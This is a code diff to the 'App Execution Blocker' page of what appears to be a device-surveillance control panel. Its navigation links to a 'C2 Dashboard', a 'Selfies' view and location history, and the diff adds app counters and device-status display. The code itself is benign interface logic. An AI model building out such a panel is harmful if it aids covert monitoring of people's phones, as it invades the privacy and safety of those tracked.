@@ -16,9 +16,10 @@
                 <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">App Execution Blocker</h1></div>
             </div>
             <div class="flex flex-wrap justify-center items-center gap-4">
+                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
+                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
                 <a href="/errors_view" class="text-xs font-bold text-red-500 hover:text-red-700 transition tracking-wide uppercase">Diagnostics</a>
                 <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
-                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
                 <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                     <option value="">Loading...</option>
                 </select>
@@ -30,6 +31,20 @@
                 <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Installed Applications</p>
                 <button type="button" id="refresh-apps-btn" class="text-xs font-semibold px-4 py-2 rounded-xl bg-purple-100 text-purple-700 hover:bg-purple-200 transition">Request Device Scan</button>
             </div>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Installed</p>
+                    <p id="apps-installed-count" class="text-3xl font-black text-gray-900">0</p>
+                </div>
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Blocked</p>
+                    <p id="apps-blocked-count" class="text-3xl font-black text-gray-900">0</p>
+                </div>
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Device Status</p>
+                    <p id="apps-device-status" class="text-lg font-bold text-gray-900">Checking...</p>
+                </div>
+            </div>
             <div id="apps-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                 <div class="col-span-full text-center text-gray-400 py-8">Waiting for data...</div>
             </div>
@@ -38,23 +53,30 @@
 
     <script>
         const selectEl = document.getElementById('device-select');
+        const appsInstalledCount = document.getElementById('apps-installed-count');
+        const appsBlockedCount = document.getElementById('apps-blocked-count');
+        const appsDeviceStatus = document.getElementById('apps-device-status');
         let currentInstalled = [];
         let currentBlocked = [];
 
         async function fetchAvailableDevices() {
             try {
                 const res = await fetch('/devices');
+                if (!res.ok) return;
                 const data = await res.json();
-                if (data.devices && data.devices.length > 0) {
-                    const val = selectEl.value;
-                    selectEl.innerHTML = '';
-                    data.devices.forEach(did => {
-                        const opt = document.createElement('option');
-                        opt.value = did; opt.textContent = did;
-                        selectEl.appendChild(opt);
-                    });
-                    if (val && data.devices.includes(val)) selectEl.value = val;
+                const devices = data.devices || [];
+                const previous = selectEl.value;
+                selectEl.innerHTML = '';
+                if (devices.length === 0) {
+                    selectEl.innerHTML = '<option value="">No devices</option>';
+                    return;
                 }
+                devices.forEach(did => {
+                    const opt = document.createElement('option');
+                    opt.value = did; opt.textContent = did;
+                    selectEl.appendChild(opt);
+                });
+                selectEl.value = devices.includes(previous) ? previous : devices[0];
             } catch(err) { console.error(err); }
         }
 
@@ -70,6 +92,9 @@
                     
                     const installedList = installedRaw ? installedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
                     const blockedList = blockedRaw ? blockedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
+                    appsInstalledCount.textContent = installedList.length;
+                    appsBlockedCount.textContent = blockedList.length;
+                    appsDeviceStatus.textContent = data.is_online ? 'Online' : 'Offline';
                     
                     // Only re-render if data actually changed
                     if(JSON.stringify(installedList) !== JSON.stringify(currentInstalled) || 
@@ -169,7 +194,7 @@
         (async () => { 
             await fetchAvailableDevices(); 
             fetchApps(); 
-            setInterval(fetchApps, 5000); 
+            setInterval(() => { if (document.visibilityState === 'visible') fetchApps(); }, 15000); 
         })();
     </script>
 </body>
